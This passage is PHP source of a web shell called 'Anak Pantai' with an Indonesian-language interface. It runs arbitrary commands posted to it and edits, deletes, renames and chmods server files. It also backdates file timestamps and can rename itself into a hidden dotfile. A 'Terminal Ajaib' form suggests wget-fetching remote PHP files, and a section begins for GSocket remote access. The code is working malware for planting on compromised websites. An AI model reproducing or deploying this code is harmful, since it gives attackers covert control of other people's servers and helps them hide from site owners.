    if (isset($_POST['__cmd__']) && is_string($_POST['__cmd__']) && trim($_POST['__cmd__']) !== '') {
        $cmd_output = wtc_execute_local($_POST['__cmd__'], $__dir__);
        
        if (strpos($cmd_output, '✅') === false && strpos($cmd_output, '❌') === false) {
            if (empty($cmd_output) || $cmd_output == "❌ No execution method available") {
                $cmd_output = "❌ Failed: " . $_POST['__cmd__'] . "\nNo output";
            } else {
                $cmd_output = "✅ Success: " . $_POST['__cmd__'] . "\n" . $cmd_output;
            }
        }
        
        $_SESSION['cmd_output'] = $cmd_output;
        $redirect_url = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
        header("Location: " . $redirect_url);
        exit;
    }
    
    if (isset($_POST['__content__']) && isset($_POST['__edit_file__']) && is_string($_POST['__edit_file__'])) {
        $target = $__dir__ . basename($_POST['__edit_file__']);
        $content = isset($_POST['__content__']) ? $_POST['__content__'] : '';
        
        $write_result = wtc_enhanced_write_file($target, $content);
        
        if ($write_result['success']) {
            $_SESSION['upload_message'] = "✅ File berhasil disimpan (metode: {$write_result['method']})";
        } else {
            $_SESSION['upload_message'] = "❌ Gagal menyimpan file";
        }
        
        $redirect_url = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
        header("Location: " . $redirect_url);
        exit;
    }
    
    if (isset($_POST['__delete_selected__'])) {
        $selected_items = isset($_POST['selected_items']) && is_array($_POST['selected_items']) ? $_POST['selected_items'] : [];
        $deleted = [];
        $failed = [];
        
        foreach ($selected_items as $item) {
            if (is_string($item)) {
                $target = $__dir__ . basename($item);
                if (file_exists($target)) {
                    if (is_dir($target)) {
                        // Recursive delete folder
                        try {
                            $files = new RecursiveIteratorIterator(
                                new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
                                RecursiveIteratorIterator::CHILD_FIRST
                            );
                            foreach ($files as $fileinfo) {
                                if ($fileinfo->isDir()) {
                                    @rmdir($fileinfo->getRealPath());
                                } else {
                                    @unlink($fileinfo->getRealPath());
                                }
                            }
                            if (@rmdir($target)) {
                                $deleted[] = $item;
                            } else {
                                $failed[] = $item;
                            }
                        } catch (Exception $e) {
                            $failed[] = $item;
                        }
                    } else {
                        if (@unlink($target)) {
                            $deleted[] = $item;
                        } else {
                            $failed[] = $item;
                        }
                    }
                }
            }
        }
        
        $message = '';
        if (!empty($deleted)) {
            $message .= "✅ Berhasil menghapus: " . implode(', ', $deleted);
        }
        if (!empty($failed)) {
            $message .= (!empty($message) ? "\n" : "") . "❌ Gagal menghapus: " . implode(', ', $failed);
        }
        
        if (!empty($message)) {
            $_SESSION['upload_message'] = $message;
        }
        
        $redirect_url = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
        header("Location: " . $redirect_url);
        exit;
    }
    
    // ===== DELETE SINGLE =====
    if (isset($_POST['__delete_single__']) && isset($_POST['__delete_file__']) && is_string($_POST['__delete_file__'])) {
        $target = $__dir__ . basename($_POST['__delete_file__']);
        if (file_exists($target)) {
            $success = false;
            if (is_dir($target)) {
                try {
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::CHILD_FIRST
                    );
                    foreach ($files as $fileinfo) {
                        if ($fileinfo->isDir()) {
                            @rmdir($fileinfo->getRealPath());
                        } else {
                            @unlink($fileinfo->getRealPath());
                        }
                    }
                    $success = @rmdir($target);
                } catch (Exception $e) {
                    $success = false;
                }
            } else {
                $success = @unlink($target);
            }
            
            $_SESSION['upload_message'] = $success ? "✅ Berhasil menghapus" : "❌ Gagal menghapus";
        }
        
        $redirect_url = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
        header("Location: " . $redirect_url);
        exit;
    }
    
    // ===== CHMOD =====
    if (isset($_POST['__chmod__']) && isset($_POST['__chmod_file__']) && is_string($_POST['__chmod_file__']) && 
        isset($_POST['__permissions__']) && is_string($_POST['__permissions__'])) {
        $target = $__dir__ . basename($_POST['__chmod_file__']);
        $permissions = $_POST['__permissions__'];
        if (file_exists($target)) {
            $octal = octdec($permissions);
            if (@chmod($target, $octal)) {
                $_SESSION['upload_message'] = "✅ Permission berhasil diubah ke $permissions";
            } else {
                $_SESSION['upload_message'] = "❌ Gagal mengubah permission";
            }
        }
        
        $redirect_url = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
        header("Location: " . $redirect_url);
        exit;
    }
    
    if (isset($_POST['__touch__']) && isset($_POST['__touch_file__']) && is_string($_POST['__touch_file__']) && 
        isset($_POST['__timestamp__']) && is_string($_POST['__timestamp__'])) {
        $target = $__dir__ . basename($_POST['__touch_file__']);
        $timestamp = $_POST['__timestamp__'];
        if (file_exists($target)) {
            $time = strtotime($timestamp);
            if ($time !== false) {
                if (@touch($target, $time)) {
                    $_SESSION['upload_message'] = "✅ Waktu berhasil diubah";
                } else {
                    $_SESSION['upload_message'] = "❌ Gagal mengubah waktu";
                }
            } else {
                $_SESSION['upload_message'] = "❌ Format waktu tidak valid";
            }
        }
        
        $redirect_url = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
        header("Location: " . $redirect_url);
        exit;
    }
    
    if (isset($_POST['__rename__']) && isset($_POST['__rename_old__']) && is_string($_POST['__rename_old__']) && 
        isset($_POST['__rename_new__']) && is_string($_POST['__rename_new__'])) {
        $old_name = $__dir__ . basename($_POST['__rename_old__']);
        $new_name = $__dir__ . basename($_POST['__rename_new__']);
        if (file_exists($old_name)) {
            if (!file_exists($new_name)) {
                if (@rename($old_name, $new_name)) {
                    $_SESSION['upload_message'] = "✅ Berhasil rename";
                } else {
                    $_SESSION['upload_message'] = "❌ Gagal rename";
                }
            } else {
                $_SESSION['upload_message'] = "❌ File dengan nama baru sudah ada";
            }
        } else {
            $_SESSION['upload_message'] = "❌ File tidak ditemukan";
        }
        
        $redirect_url = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
        header("Location: " . $redirect_url);
        exit;
    }
    
    if (isset($_POST['__lock_action__']) && is_string($_POST['__lock_action__'])) {
        if ($_POST['__lock_action__'] === 'hide') {
            $hidden_path = wtc_hide_self(__FILE__);
            if ($hidden_path) {
                $new_url = str_replace(basename(__FILE__), basename($hidden_path), $_SERVER['PHP_SELF']);
                $redirect_url = $new_url . "?__d__=" . urlencode($__dir__);
                header("Location: " . $redirect_url);
                exit;
            }
        } elseif ($_POST['__lock_action__'] === 'reveal') {
            $current_file = basename(__FILE__);
            $clean_name = ltrim($current_file, '.');
            $revealed_path = dirname(__FILE__) . '/' . $clean_name;
            
            if (@rename(__FILE__, $revealed_path)) {
                $new_url = str_replace(basename(__FILE__), $clean_name, $_SERVER['PHP_SELF']);
                $redirect_url = $new_url . "?__d__=" . urlencode($__dir__);
                header("Location: " . $redirect_url);
                exit;
            }
        }
    }
    
    if (isset($_POST['__extract_zip__']) && isset($_POST['__zip_file__']) && is_string($_POST['__zip_file__'])) {
        $zip_file = $__dir__ . basename($_POST['__zip_file__']);
        if (file_exists($zip_file)) {
            $extract_success = false;
            
            if (class_exists('ZipArchive')) {
                $zip = new ZipArchive();
                if ($zip->open($zip_file) === TRUE) {
                    if ($zip->extractTo($__dir__)) {
                        $extract_success = true;
                        $_SESSION['upload_message'] = "✅ ZIP berhasil diekstrak (ZipArchive)";
                    }
                    $zip->close();
                }
            }
            
            if (!$extract_success && function_exists('shell_exec') && !ini_get('safe_mode')) {
                $unzip_cmd = 'cd "' . addslashes($__dir__) . '" && unzip -o ' . escapeshellarg(basename($zip_file)) . ' 2>&1';
                $output = @shell_exec($unzip_cmd);
                if (strpos($output, 'inflating:') !== false) {
                    $extract_success = true;
                    $_SESSION['upload_message'] = "✅ ZIP berhasil diekstrak (shell_unzip)";
                }
            }
            
            if (!$extract_success && class_exists('ZipArchive')) {
                $zip = new ZipArchive();
                if ($zip->open($zip_file) === TRUE) {
                    $zip->extractTo($__dir__);
                    $zip->close();
                    $extract_success = true;
                    $_SESSION['upload_message'] = "✅ ZIP berhasil diekstrak (ZipArchive retry)";
                }
            }
            
            if (!$extract_success) {
                $_SESSION['upload_message'] = "❌ Gagal mengekstrak ZIP";
            }
        }
        
        $redirect_url = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
        header("Location: " . $redirect_url);
        exit;
    }
}

// ============================================================
// ============================================================

if (isset($_GET['__del__']) && is_string($_GET['__del__'])) {
    $target = $__dir__ . basename($_GET['__del__']);
    if (file_exists($target)) {
        $success = false;
        if (is_dir($target)) {
            try {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::CHILD_FIRST
                );
                foreach ($files as $fileinfo) {
                    if ($fileinfo->isDir()) {
                        @rmdir($fileinfo->getRealPath());
                    } else {
                        @unlink($fileinfo->getRealPath());
                    }
                }
                $success = @rmdir($target);
            } catch (Exception $e) {
                $success = false;
            }
        } else {
            $success = @unlink($target);
        }
        
        $_SESSION['upload_message'] = $success ? "✅ Berhasil menghapus" : "❌ Gagal menghapus";
    }
    $redirect_url = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
    header("Location: " . $redirect_url);
    exit;
}

if (isset($_GET['__extract__']) && is_string($_GET['__extract__'])) {
    $target = $__dir__ . basename($_GET['__extract__']);
    if (file_exists($target) && pathinfo($target, PATHINFO_EXTENSION) === 'zip') {
        $extract_success = false;
        
        if (class_exists('ZipArchive')) {
            $zip = new ZipArchive();
            if ($zip->open($target) === TRUE) {
                if ($zip->extractTo($__dir__)) {
                    $extract_success = true;
                    $_SESSION['upload_message'] = "✅ ZIP berhasil diekstrak (ZipArchive)";
                }
                $zip->close();
            }
        }
        
        if (!$extract_success && function_exists('shell_exec') && !ini_get('safe_mode')) {
            $unzip_cmd = 'cd "' . addslashes($__dir__) . '" && unzip -o ' . escapeshellarg(basename($target)) . ' 2>&1';
            $output = @shell_exec($unzip_cmd);
            if (strpos($output, 'inflating:') !== false) {
                $extract_success = true;
                $_SESSION['upload_message'] = "✅ ZIP berhasil diekstrak (shell_unzip)";
            }
        }
        
        if (!$extract_success) {
            $_SESSION['upload_message'] = "❌ Gagal mengekstrak ZIP";
        }
    }
    $redirect_url = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
    header("Location: " . $redirect_url);
    exit;
}

if (isset($_GET['logout'])) {
    session_destroy();
    if (!headers_sent()) {
        setcookie('wp_temp_' . substr(md5($host), 0, 8), '', time() - 3600, '/');
    }
    echo '<script>window.location.href="?";</script>';
    exit;
}

// ============================================================
// ============================================================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🏝️ Anak Pantai</title>
    <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Quicksand:wght@300;400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --sand: #f9e9d2;
            --sand-dark: #eed9b5;
            --ocean-light: #7ed4e8;
            --ocean: #4aa3c2;
            --ocean-dark: #2c7a9e;
            --coral: #ff8a7a;
            --coral-dark: #ff6b5e;
            --palm: #2e7d5e;
            --palm-light: #3c9b77;
            --sun: #ffd966;
            --sunset: #ffb347;
            --white: #ffffff;
            --text-dark: #2c3e50;
            --text-light: #ecf0f1;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Quicksand', sans-serif;
            background: linear-gradient(145deg, #b5e1f5 0%, #f9e9d2 100%);
            color: var(--text-dark);
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }
        
        .beach-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 30%, rgba(71, 65, 65, 0.7) 0%, transparent 30%),
                radial-gradient(circle at 80% 70%, rgba(255, 215, 0, 0.2) 0%, transparent 40%),
                linear-gradient(145deg, rgba(126, 212, 232, 0.6) 0%, rgba(249, 233, 210, 0.8) 100%);
            z-index: -3;
            pointer-events: none;
        }
        
        .beach-bg::before {
            content: "";
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 1000px;
            height: 1000px;
            background-image: url('https://i.ibb.co/nv3B26W/image.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            opacity: 0.5;
            pointer-events: none;
            z-index: -2;
        }
        
        .ocean-waves {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 120px;
            background: repeating-linear-gradient(
                transparent 0px,
                transparent 20px,
                rgba(126, 212, 232, 0.2) 20px,
                rgba(126, 212, 232, 0.2) 40px
            );
            animation: waveMove 10s linear infinite;
            z-index: -2;
            pointer-events: none;
        }
        
        @keyframes waveMove {
            0% { background-position: 0 0; }
            100% { background-position: 100px 0; }
        }
        
        .palm-leaf {
            position: fixed;
            width: 200px;
            height: 200px;
            background: radial-gradient(circle at 30% 30%, var(--palm-light) 0%, var(--palm) 100%);
            clip-path: polygon(20% 0%, 80% 0%, 100% 100%, 0% 100%);
            opacity: 0.3;
            z-index: -1;
            pointer-events: none;
        }
        
        .palm-1 {
            bottom: 0;
            left: 0;
            transform: rotate(10deg);
        }
        
        .palm-2 {
            top: 0;
            right: 0;
            transform: rotate(200deg);
        }
        
        .tropical-container {
            max-width: 1600px;
            margin: 0 auto;
            padding: 30px 20px;
            position: relative;
            z-index: 1;
        }
        
        .tropical-header {
            background: rgba(248, 193, 193, 0.14);
            backdrop-filter: blur(15px);
            border-radius: 40px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 
                0 20px 50px rgba(44, 122, 158, 0.2),
                0 5px 15px rgba(0, 0, 0, 0.1),
                inset 0 2px 10px rgba(255, 255, 255, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.4);
            position: relative;
            overflow: hidden;
        }
        
        .tropical-header::after {
            content: "ℒ𝓮𝓮🏖️";
            position: absolute;
            top: -10px;
            right: 20px;
            font-size: 100px;
            opacity: 0.1;
            transform: rotate(10deg);
        }
        
        .tropical-header h1 {
            font-family: 'Pacifico', cursive;
            font-size: 4rem;
            font-weight: 400;
            margin-bottom: 20px;
            background: linear-gradient(135deg, var(--ocean-dark), var(--coral-dark), var(--sunset));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 3px 3px 10px rgba(255, 255, 255, 0.5);
            letter-spacing: 2px;
        }
        
        .path-nav {
            background: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(10px);
            padding: 20px 25px;
            border-radius: 30px;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            word-break: break-all;
            border: 1px solid rgba(255, 255, 255, 0.6);
            box-shadow: 0 5px 15px rgba(44, 122, 158, 0.1);
        }
        
        .path-nav a {
            color: var(--ocean-dark);
            text-decoration: none;
            transition: all 0.3s;
            padding: 5px 10px;
            border-radius: 20px;
            font-weight: 600;
        }
        
        .path-nav a:hover {
            color: var(--coral);
            background: rgba(255, 255, 255, 0.5);
            box-shadow: 0 2px 8px rgba(255, 138, 122, 0.3);
        }
        
        .status-badge {
            display: inline-block;
            padding: 15px 30px;
            border-radius: 40px;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 20px;
            background: rgba(255, 255, 255, 0.3);
            backdrop-filter: blur(10px);
            color: var(--text-dark);
            border: 1px solid rgba(255, 255, 255, 0.5);
            box-shadow: 0 4px 15px rgba(44, 122, 158, 0.2);
            letter-spacing: 1px;
        }
        
        .action-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            margin-top: 25px;
        }
        
        .tropical-btn {
            padding: 14px 28px;
            border-radius: 40px;
            border: none;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            font-family: 'Quicksand', sans-serif;
            font-size: 15px;
            backdrop-filter: blur(5px);
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
        }
        
        .tropical-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(44, 122, 158, 0.3);
        }
        
        .btn-ocean { 
            background: linear-gradient(145deg, var(--ocean-light), var(--ocean-dark));
            color: white; 
        }
        
        .btn-sand { 
            background: rgba(249, 233, 210, 0.7);
            color: var(--text-dark);
            border: 1px solid rgba(255, 255, 255, 0.5);
        }
        
        .btn-coral { 
            background: linear-gradient(145deg, var(--coral), var(--coral-dark));
            color: white; 
        }
        
        .btn-palm { 
            background: linear-gradient(145deg, var(--palm-light), var(--palm));
            color: white; 
        }
        
        .btn-sun { 
            background: linear-gradient(145deg, var(--sun), var(--sunset));
            color: var(--text-dark); 
        }
        
        .messages {
            margin-bottom: 30px;
        }
        
        .upload-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        
        .tropical-card {
            background: rgba(255, 255, 255, 0.3);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.4);
            border-radius: 30px;
            padding: 30px;
            box-shadow: 
                0 20px 40px rgba(44, 122, 158, 0.1),
                inset 0 2px 10px rgba(255, 255, 255, 0.5);
            transition: all 0.3s ease;
        }
        
        .tropical-card:hover {
            transform: translateY(-5px);
            box-shadow: 
                0 25px 50px rgba(44, 122, 158, 0.15),
                inset 0 2px 15px rgba(255, 255, 255, 0.6);
        }
        
        .tropical-card h3 {
            color: var(--ocean-dark);
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            gap: 15px;
            font-size: 1.5rem;
            font-weight: 700;
            border-bottom: 2px solid rgba(255, 255, 255, 0.4);
            padding-bottom: 15px;
        }
        
        .tropical-input {
            width: 100%;
            padding: 16px 20px;
            background: rgba(255, 255, 255, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.6);
            border-radius: 50px;
            color: var(--text-dark);
            font-size: 15px;
            margin-bottom: 20px;
            font-family: 'Quicksand', sans-serif;
            transition: all 0.3s;
            backdrop-filter: blur(5px);
        }
        
        .tropical-input:focus {
            outline: none;
            border-color: var(--ocean);
            box-shadow: 0 0 0 3px rgba(74, 163, 194, 0.2);
            background: rgba(255, 255, 255, 0.7);
        }
        
        .tropical-table {
            width: 100%;
            background: rgba(255, 255, 255, 0.3);
            backdrop-filter: blur(15px);
            border-radius: 30px;
            overflow: hidden;
            margin-bottom: 40px;
            border: 1px solid rgba(255, 255, 255, 0.4);
            box-shadow: 0 20px 40px rgba(44, 122, 158, 0.1);
        }
        
        .tropical-table th {
            background: rgba(255, 255, 255, 0.2);
            padding: 20px;
            text-align: left;
            font-weight: 700;
            color: var(--ocean-dark);
            border-bottom: 2px solid rgba(255, 255, 255, 0.4);
            font-size: 1.1rem;
        }
        
        .tropical-table td {
            padding: 18px 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
            transition: all 0.3s;
        }
        
        .tropical-table tr:hover {
            background: rgba(255, 255, 255, 0.1);
        }
        
        .tropical-name {
            cursor: pointer;
            color: var(--ocean-dark);
            text-decoration: none;
            font-weight: 600;
            padding: 8px 15px;
            border-radius: 30px;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }
        
        .tropical-name:hover {
            background: rgba(255, 255, 255, 0.4);
            transform: translateX(5px);
            box-shadow: 0 4px 12px rgba(44, 122, 158, 0.2);
        }
        
        .folder-name {
            color: var(--palm);
        }
        
        .file-name {
            color: var(--ocean-dark);
        }
        
        .action-icon {
            padding: 8px 16px;
            border-radius: 30px;
            font-size: 13px;
            margin: 3px;
            display: inline-block;
            text-decoration: none;
            font-family: 'Quicksand', sans-serif;
            font-weight: 600;
            transition: all 0.3s;
            border: 1px solid transparent;
            background: rgba(255, 255, 255, 0.3);
            color: var(--text-dark);
        }
        
        .action-icon:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            background: rgba(255, 255, 255, 0.5);
        }
        
        .tropical-terminal {
            background: rgba(255, 255, 255, 0.3);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.4);
            border-radius: 30px;
            padding: 30px;
            margin-top: 40px;
            margin-bottom: 40px;
            box-shadow: 
                0 20px 40px rgba(44, 122, 158, 0.1),
                inset 0 2px 10px rgba(255, 255, 255, 0.5);
        }
        
        .terminal-output {
            background: rgba(0, 0, 0, 0.2);
            backdrop-filter: blur(5px);
            color: white;
            padding: 25px;
            border-radius: 20px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            white-space: pre-wrap;
            max-height: 500px;
            overflow-y: auto;
            margin-top: 20px;
            line-height: 1.6;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .command-status {
            display: inline-block;
            padding: 8px 20px;
            border-radius: 40px;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 10px;
            letter-spacing: 1px;
        }
        
        .status-success {
            background: rgba(46, 125, 94, 0.2);
            color: var(--palm);
            border: 1px solid rgba(46, 125, 94, 0.3);
        }
        
        .status-error {
            background: rgba(255, 107, 94, 0.2);
            color: var(--coral-dark);
            border: 1px solid rgba(255, 107, 94, 0.3);
        }
        
        .tropical-editor {
            background: rgba(255, 255, 255, 0.3);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.4);
            border-radius: 30px;
            padding: 30px;
            margin-bottom: 40px;
        }
        
        .tropical-editor textarea {
            width: 100%;
            height: 400px;
            background: rgba(0, 0, 0, 0.2);
            color: white;
            font-family: 'Courier New', monospace;
            font-size: 15px;
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 20px;
            padding: 20px;
            resize: vertical;
        }
        
        .tropical-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(8px);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        
        .modal-content {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.6);
            border-radius: 50px;
            padding: 40px;
            max-width: 500px;
            width: 90%;
            box-shadow: 
                0 40px 80px rgba(44, 122, 158, 0.3),
                0 10px 30px rgba(0, 0, 0, 0.2);
            animation: modalAppear 0.4s ease-out;
        }
        
        .perm-badge {
            display: inline-block;
            padding: 6px 12px;
            border-radius: 20px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            font-weight: 600;
            cursor: help;
            transition: all 0.2s;
        }

        .perm-writable {
            background: rgba(46, 125, 94, 0.2);
            color: #2e7d5e;
            border: 1px solid rgba(46, 125, 94, 0.3);
        }

        .perm-readonly {
            background: rgba(255, 107, 94, 0.2);
            color: #ff6b5e;
            border: 1px solid rgba(255, 107, 94, 0.3);
        }

        .perm-badge:hover {
            transform: scale(1.05);
            filter: brightness(1.2);
        }
        
        @keyframes modalAppear {
            from { transform: scale(0.9) translateY(20px); opacity: 0; }
            to { transform: scale(1) translateY(0); opacity: 1; }
        }
        
        input[type="checkbox"] {
            width: 20px;
            height: 20px;
            accent-color: var(--coral);
            cursor: pointer;
        }
        
        ::-webkit-scrollbar {
            width: 12px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 6px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: linear-gradient(145deg, var(--ocean-light), var(--ocean-dark));
            border-radius: 6px;
            border: 2px solid rgba(255, 255, 255, 0.3);
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(145deg, var(--coral), var(--coral-dark));
        }
        
        @media (max-width: 768px) {
            .tropical-container { padding: 15px; }
            .upload-grid { grid-template-columns: 1fr; }
            .action-buttons { flex-direction: column; }
            .tropical-btn { width: 100%; }
            .tropical-header h1 { font-size: 2.5rem; }
            .modal-content { padding: 25px; }
        }

        #magic-terminal-btn:hover {
            transform: scale(1.15) rotate(5deg);
            filter: drop-shadow(0 0 30px rgba(255,70,70,1));
            border-color: #ff4646 !important;
        }

        #magic-terminal-output pre {
            background: rgba(0,0,0,0.8);
            color: #00ff00;
            padding: 15px;
            border-radius: 10px;
            font-family: monospace;
            font-size: 13px;
            max-height: 300px;
            overflow-y: auto;
            border: 1px solid #ff4646;
            margin-top: 10px;
        }

        .quick-cmd:hover {
            background: #ff4646 !important;
            color: white !important;
        }
    </style>
</head>
<body>
    <div class="beach-bg"></div>
    <div class="ocean-waves"></div>
    <div class="palm-leaf palm-1"></div>
    <div class="palm-leaf palm-2"></div>
    
    <div class="tropical-container">
        <div class="tropical-header">
            <h1>🏝️ Pantai</h1>
            
            <div class="path-nav">
                <?php
                $parts = explode('/', trim($__dir__, '/'));
                $current = '';
                echo '<a href="?__d__=/">☯Root☯</a>';
                foreach ($parts as $part) {
                    if ($part) {
                        $current .= '/' . $part;
                        echo '/<a href="?__d__=' . urlencode($current) . '">' . htmlspecialchars($part) . '</a>';
                    }
                }
                ?>
            </div>
            
            <div class="status-badge">
                <span>🏖️ Status:</span>
                <span style="margin-left: 15px;">🔧 Perm: <?php 
                    $perms = @fileperms($__dir__);
                    echo $perms ? substr(sprintf('%o', $perms), -4) : '????'; 
                ?></span>
                <span style="margin-left: 15px;">💾 Free: <?php 
                    $free_space = @disk_free_space($__dir__);
                    echo $free_space ? round($free_space/1024/1024/1024, 2) : '?'; 
                ?>GB</span>
                <span style="margin-left: 15px;">🔒 Status: <?php echo wtc_is_self_hidden(__FILE__) ? 'Tersembunyi' : 'Bisa'; ?></span>
            </div>  
            
            <?php if (!empty($messages)): ?>
                <div style="margin: 20px 0;">
                    <?php foreach ($messages as $msg): ?>
                        <?php 
                        $is_success = strpos($msg, '✅') !== false;
                        $bg_color = $is_success ? 'rgba(46, 125, 94, 0.2)' : 'rgba(255, 107, 94, 0.2)';
                        $border_color = $is_success ? '#2e7d5e' : '#ff6b5e';
                        ?>
                        <div style="background: <?php echo $bg_color; ?>; 
                                    border-left: 5px solid <?php echo $border_color; ?>;
                                    padding: 15px 20px;
                                    margin-bottom: 10px;
                                    border-radius: 15px;
                                    backdrop-filter: blur(5px);
                                    white-space: pre-line;">
                            <?php echo htmlspecialchars($msg); ?>
                        </div>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>

            <div class="action-buttons">
                <a href="?__d__=<?php echo urlencode($_SESSION['initial_dir']); ?>" class="tropical-btn btn-ocean">🏝️ Home</a>
                <a href="?__d__=<?php echo urlencode(dirname($__dir__)); ?>" class="tropical-btn btn-sand"> ↩ kembali 1 path</a>
                <a href="?__d__=<?php echo urlencode($__dir__); ?>" class="tropical-btn btn-sand">🔄 Refresh</a>
                <button class="tropical-btn btn-palm" onclick="showCreateModal()">➕ Create</button>
                <button class="tropical-btn btn-coral" onclick="showDeleteModal()">🗑 Delete</button>
                <a href="?logout=1" class="tropical-btn btn-coral">🚪 Logout</a>
            </div>
        </div>
        
        <div style="text-align: center; margin: 30px 0 20px 0;">
            <img src="https://i.ibb.co/nv3B26W/image.png" 
                 id="magic-terminal-btn"
                 style="width: 70px; height: 70px; cursor: pointer; filter: drop-shadow(0 0 20px rgba(255,70,70,0.8)); 
                        transition: all 0.4s; border-radius: 50%; border: 2px solid transparent;"
                 title="⚡ Klik untuk membuka Terminal Ajaib ⚡"
                 onclick="toggleMagicTerminal()">
            <div style="color: #ff4646; font-size: 14px; margin-top: 8px; font-weight: bold;">
                ⚡ TERMINAL AJAIB ⚡
            </div>
        </div>
        
        <!-- Container Terminal (Awalnya Tersembunyi) -->
        <div id="magic-terminal" style="display: none; margin-bottom: 40px;">
            <div class="tropical-card" style="background: linear-gradient(145deg, #0a0b0e, #1a1b1f); border: 2px solid #ff4646;">
                
                <!-- Header Terminal -->
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                    <div style="display: flex; align-items: center; gap: 10px;">
                        <img src="https://i.ibb.co/nv3B26W/image.png" style="width: 30px; height: 30px;">
                        <h3 style="color: #ff4646; margin: 0;">⚡ TERMINAL AJAIB</h3>
                    </div>
                    <span style="color: #ff4646; cursor: pointer; font-size: 24px;" onclick="toggleMagicTerminal()">✖</span>
                </div>
                
                <!-- Info Path Saat Ini -->
                <div style="background: rgba(255,70,70,0.1); padding: 10px 15px; border-radius: 30px; margin-bottom: 15px;">
                    <span style="color: #ff4646;">📁 PATH: </span>
                    <span style="color: #fff; font-family: monospace;"><?php echo htmlspecialchars($__dir__); ?></span>
                </div>
                
                <!-- Form Terminal -->
                <form method="post" id="magic-terminal-form" style="margin-bottom: 15px;">
                    <input type="hidden" name="__magic_path__" value="<?php echo htmlspecialchars($__dir__); ?>">
                    <div style="display: flex; gap: 10px;">
                        <span style="color: #ff4646; font-family: monospace; font-size: 18px;">$</span>
                        <input type="text" name="__magic_cmd__" 
                               placeholder="Contoh: wget -O file.php https://url.com/file.php | ls -la | php -v" 
                               style="flex: 1; background: rgba(0,0,0,0.3); border: 1px solid #ff4646; 
                                      color: #00ff00; padding: 10px 15px; border-radius: 30px;
                                      font-family: monospace;"
                               id="magic-cmd-input">
                        <button type="submit" 
                                style="background: #ff4646; color: white; border: none; 
                                       padding: 10px 25px; border-radius: 30px; cursor: pointer;
                                       font-weight: bold;">⚡ RUN</button>
                    </div>
                </form>
                
                <!-- ===== GSOCKET SECTION ===== -->
                <div style="margin: 25px 0; padding: 15px; background: rgba(0,0,0,0.2); border: 1px solid #ff4646; border-radius: 15px;">
